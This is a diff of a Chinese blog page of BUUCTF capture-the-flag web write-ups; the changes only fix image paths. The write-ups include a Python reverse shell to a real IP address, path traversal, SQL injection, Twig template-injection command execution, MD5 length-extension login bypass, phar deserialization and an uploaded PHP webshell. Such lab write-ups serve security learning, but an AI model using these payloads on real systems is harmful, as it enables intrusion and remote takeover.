-<pre><code>?url=../../../../../../proc/self/fd/3</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015215917291.png" srcset="/img/loading.gif" alt="image-20201015215917291"></p>
+<pre><code>?url=../../../../../../proc/self/fd/3</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201015215917291.png" srcset="/img/loading.gif" alt="image-20201015215917291"></p>
 <p>传参key和shell,回显ok，但不回显命令执行的结果。进行反弹shell。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015220654731.png" srcset="/img/loading.gif" alt="image-20201015220654731"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201015220654731.png" srcset="/img/loading.gif" alt="image-20201015220654731"></p>
 <p>payload</p>
 <pre class=" language-python"><code class="language-python"><span class="token operator">/</span>no_one_know_the_manager?key<span class="token operator">=</span><span class="token number">608b8a425ae3a1f6d7e9426582804b8a</span><span class="token operator">&amp;</span>shell<span class="token operator">=</span>python2<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>27import<span class="token operator">%</span>20socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>s<span class="token operator">%</span>3dsocket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">2247.56</span><span class="token punctuation">.</span><span class="token number">176.152</span><span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">8080</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span>20os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">%</span>3dsubprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/bin/sh'</span><span class="token punctuation">,</span><span class="token string">'-i'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>shell<span class="token operator">%</span>3dTrue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">27</span></code></pre>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015233736978.png" srcset="/img/loading.gif" alt="image-20201015233736978"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201015233736978.png" srcset="/img/loading.gif" alt="image-20201015233736978"></p>
 <p>反弹成功，根目录下读flag。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015233713962.png" srcset="/img/loading.gif" alt="image-20201015233713962"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201015233713962.png" srcset="/img/loading.gif" alt="image-20201015233713962"></p>
 <h1 id="CISCN-2019-华北赛区-Day2-Web-Web1"><a href="#CISCN-2019-华北赛区-Day2-Web-Web1" class="headerlink" title="CISCN-2019-华北赛区-Day2-Web-Web1"></a>CISCN-2019-华北赛区-Day2-Web-Web1</h1><p>进来页面就说表和列都给你了，试了一下还存在过滤。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201016155344544.png" srcset="/img/loading.gif" alt="image-20201016155344544"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201016155344544.png" srcset="/img/loading.gif" alt="image-20201016155344544"></p>
 <p>fuzz一下看还有哪些被ban了。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201016155309484.png" srcset="/img/loading.gif" alt="image-20201016155309484"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201016155309484.png" srcset="/img/loading.gif" alt="image-20201016155309484"></p>
 <p>输入1，2有不同的回显</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201016152644448.png" srcset="/img/loading.gif" alt="image-20201016152644448"></p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201016152707776.png" srcset="/img/loading.gif" alt="image-20201016152707776"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201016152644448.png" srcset="/img/loading.gif" alt="image-20201016152644448"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201016152707776.png" srcset="/img/loading.gif" alt="image-20201016152707776"></p>
 <p>其他数字是这个回显</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201016153026320.png" srcset="/img/loading.gif" alt="image-20201016153026320"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201016153026320.png" srcset="/img/loading.gif" alt="image-20201016153026320"></p>
 <p>其他字符是返回布尔false</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201016152907399.png" srcset="/img/loading.gif" alt="image-20201016152907399"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201016152907399.png" srcset="/img/loading.gif" alt="image-20201016152907399"></p>
 <p>那应该就是布尔盲注了。</p>
 <p>脚本</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
@@ -1525,12 +1525,12 @@ flag<span class="token operator">=</span><span class="token string">""</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre>
 <h2 id="浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维"><a href="#浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维" class="headerlink" title="浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维"></a>浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维</h2><p><strong><em>考点：伪协议</em></strong></p>
 <p>进来给了源码，看到这么多file_get_contents大概率是伪协议合集。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019122045475.png" srcset="/img/loading.gif" alt="image-20201019122045475"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201019122045475.png" srcset="/img/loading.gif" alt="image-20201019122045475"></p>
 <p>先用传text用php://input过第一个条件，第二个include函数用php://filter读useless.php。</p>
 <pre><code>/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=useless.php&amp;password=22
 
 同时body里传一个welcome to the zjctf</code></pre><p>读到源码</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019122521742.png" srcset="/img/loading.gif" alt="image-20201019122521742"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201019122521742.png" srcset="/img/loading.gif" alt="image-20201019122521742"></p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  
 
 <span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//flag.php  </span>
@@ -1547,26 +1547,26 @@ flag<span class="token operator">=</span><span class="token string">""</span>
 <p>就最简单的反序列,向password传一下得到flag。</p>
 <p>payload</p>
 <pre class=" language-php"><code class="language-php"><span class="token operator">?</span>text<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</span></code></pre>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019122721837.png" srcset="/img/loading.gif" alt="image-20201019122721837"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201019122721837.png" srcset="/img/loading.gif" alt="image-20201019122721837"></p>
 <h2 id="BJDCTF-2020-Web-Cookie-is-so-subtle"><a href="#BJDCTF-2020-Web-Cookie-is-so-subtle" class="headerlink" title="BJDCTF-2020-Web-Cookie is so subtle!"></a>BJDCTF-2020-Web-Cookie is so subtle!</h2><p><strong><em>考点：ssti</em></strong></p>
 <p>看这题就多少和cookie沾点关系。</p>
 <p>三个界面，有用的应该就是flag.php，他的功能是以cookie形式传入用户输入的数据，再将数据作为用户名显示在界面上。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019130705606.png" srcset="/img/loading.gif" alt="image-20201019130705606"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201019130705606.png" srcset="/img/loading.gif" alt="image-20201019130705606"></p>
 <p>先是尝试了cookie注入不对，怀疑存在ssti，进行测试。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019130848504.png" srcset="/img/loading.gif" alt="image-20201019130848504"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201019130848504.png" srcset="/img/loading.gif" alt="image-20201019130848504"></p>
 <p>twig通用payload试试</p>
-<pre><code>user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019171557047.png" srcset="/img/loading.gif" alt="image-20201019171557047"></p>
+<pre><code>user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201019171557047.png" srcset="/img/loading.gif" alt="image-20201019171557047"></p>
 <p>读flag</p>
-<pre><code>user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019171132646.png" srcset="/img/loading.gif" alt="image-20201019171132646"></p>
+<pre><code>user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201019171132646.png" srcset="/img/loading.gif" alt="image-20201019171132646"></p>
 <h2 id="ByteCTF-2019-Web-ezcms"><a href="#ByteCTF-2019-Web-ezcms" class="headerlink" title="ByteCTF-2019-Web-ezcms"></a>ByteCTF-2019-Web-ezcms</h2><p>考点：md5拓展攻击，phar反序列化</p>
 <p>进来是个登录界面</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019174530573.png" srcset="/img/loading.gif" alt="image-20201019174530573"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201019174530573.png" srcset="/img/loading.gif" alt="image-20201019174530573"></p>
 <p>随便输下账户密码进入文件上传界面</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019174621449.png" srcset="/img/loading.gif" alt="image-20201019174621449"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201019174621449.png" srcset="/img/loading.gif" alt="image-20201019174621449"></p>
 <p>点这个view detail是下面这种界面，返回上传的文件类型和文件位置。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019174712097.png" srcset="/img/loading.gif" alt="image-20201019174712097"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201019174712097.png" srcset="/img/loading.gif" alt="image-20201019174712097"></p>
 <p>随便上传一个文件，出现下面的回显。也就是说上传要求admin权限。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201021170641488.png" srcset="/img/loading.gif" alt="image-20201021170641488"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201021170641488.png" srcset="/img/loading.gif" alt="image-20201021170641488"></p>
 <p>先扫一下，扫出了<a href="http://www.zip。代码审计。" target="_blank" rel="noopener">www.zip。代码审计。</a></p>
 <p>index.php是刚刚的登录页面，它要求传入的password不能等于”admin”。</p>
 <pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//index.php</span>
@@ -1680,11 +1680,11 @@ flag<span class="token operator">=</span><span class="token string">""</span>
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span></code></pre>
 <p>//用hashpump构造payload</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201021170019191.png" srcset="/img/loading.gif" alt="image-20201021170019191"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201021170019191.png" srcset="/img/loading.gif" alt="image-20201021170019191"></p>
 <p>向用户名传admin,密码传这个进行登录。</p>
 <pre><code>admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00dwm2</code></pre><p>再向上传界面添加cookie user后，刷新页面。</p>
 <pre><code>user=4a4273909fdfabb4aa22b55264e7330e</code></pre><p>可以看到文件已经上传成功了。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201021170500217.png" srcset="/img/loading.gif" alt="image-20201021170500217"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201021170500217.png" srcset="/img/loading.gif" alt="image-20201021170500217"></p>
 <p>要想方法传shell。但从源码中可以看到，由于.htaccess内容完全被控制，导致php文件无法正常解析。</p>
 <pre class=" language-php"><code class="language-php">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
         <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">,</span> <span class="token string">'lolololol, i control all'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -1735,13 +1735,13 @@ flag<span class="token operator">=</span><span class="token string">""</span>
 <span class="token punctuation">}</span>
 </code></pre>
 <p>继续向下看代码，思考如何构建链。File类的析构函数中checker调用了本类不存在的函数upload_file(),这让人想到_ _ call()方法，而Profile类中正好存在可利用的_ _call，在call方法中$admin调用了open方法。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201025161531936.png" srcset="/img/loading.gif" alt="image-20201025161531936"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201025161531936.png" srcset="/img/loading.gif" alt="image-20201025161531936"></p>
 <p>这是题目的open方法。这样看好像没什么出路了。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201025163002411.png" srcset="/img/loading.gif" alt="image-20201025163002411"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201025163002411.png" srcset="/img/loading.gif" alt="image-20201025163002411"></p>
 <p>但是类中的admin是可控的，如果我们将admin定义为php中一个内置类的对象，且这个类有open函数，功能是删除或更改文件信息就能达到目的。如图，搜到了ZipArchive类。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201025175111185.png" srcset="/img/loading.gif" alt="image-20201025175111185"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201025175111185.png" srcset="/img/loading.gif" alt="image-20201025175111185"></p>
 <p>参数：filename文件名，flags是打开文档的模式，这里的参数就选择这两个。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201025180311424.png" srcset="/img/loading.gif" alt="image-20201025180311424"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201025180311424.png" srcset="/img/loading.gif" alt="image-20201025180311424"></p>
 <p>综上进行phar文件构造，脚本如下：</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>
@@ -1782,7 +1782,7 @@ flag<span class="token operator">=</span><span class="token string">""</span>
 <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter">?></span></code></pre>
 <p>先上传一个shell（因为每次访问upload都会重置.htaccess，为了使下面更改.htaccess操作生效）,check()里的黑名单用拼接形式绕过。</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201025191843151.png" srcset="/img/loading.gif" alt="image-20201025191843151"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201025191843151.png" srcset="/img/loading.gif" alt="image-20201025191843151"></p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token variable">$a</span><span class="token operator">=</span><span class="token string">"syste"</span><span class="token punctuation">;</span>
 <span class="token variable">$b</span><span class="token operator">=</span><span class="token string">"m"</span><span class="token punctuation">;</span>
@@ -1791,13 +1791,13 @@ flag<span class="token operator">=</span><span class="token string">""</span>
 <span class="token delimiter">?></span>
 <span class="token comment" spellcheck="true">//存储位置：./sandbox/479bfbc13b06e3588906f74bae9507c9/25a452927110e39a345a2511c57647f2.php</span></code></pre>
 <p>记录存储位置</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201026112809109.png" srcset="/img/loading.gif" alt="image-20201026112809109"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201026112809109.png" srcset="/img/loading.gif" alt="image-20201026112809109"></p>
 <p>上传phar文件，记录存储位置：./sandbox/479bfbc13b06e3588906f74bae9507c9/444a6fb20b7dbea9db85ca6b90f304cf.phar</p>
-<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201026105602172.png" srcset="/img/loading.gif" alt="image-20201026105602172"></p>
+<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201026105602172.png" srcset="/img/loading.gif" alt="image-20201026105602172"></p>
 <p>用php://filter/resource=phar://绕过伪协议过滤触发反序列化，执行对.htaccess的操作。</p>
-<pre><code>view.php?filename=444a6fb20b7dbea9db85ca6b90f304cf.phar&amp;filepath=php://filter/resource=phar://sandbox/479bfbc13b06e3588906f74bae9507c9/444a6fb20b7dbea9db85ca6b90f304cf.phar</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201026112509260.png" srcset="/img/loading.gif" alt="image-20201026112509260"></p>
+<pre><code>view.php?filename=444a6fb20b7dbea9db85ca6b90f304cf.phar&amp;filepath=php://filter/resource=phar://sandbox/479bfbc13b06e3588906f74bae9507c9/444a6fb20b7dbea9db85ca6b90f304cf.phar</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201026112509260.png" srcset="/img/loading.gif" alt="image-20201026112509260"></p>
 <p>直接访问shell位置读取flag。</p>
-<pre><code>/sandbox/479bfbc13b06e3588906f74bae9507c9/25a452927110e39a345a2511c57647f2.php?a=cat%20../../../../../../flag;</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201026111950025.png" srcset="/img/loading.gif" alt="image-20201026111950025"></p>
+<pre><code>/sandbox/479bfbc13b06e3588906f74bae9507c9/25a452927110e39a345a2511c57647f2.php?a=cat%20../../../../../../flag;</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201026111950025.png" srcset="/img/loading.gif" alt="image-20201026111950025"></p>
 <p><strong>持续更新</strong></p>
 
             <hr>
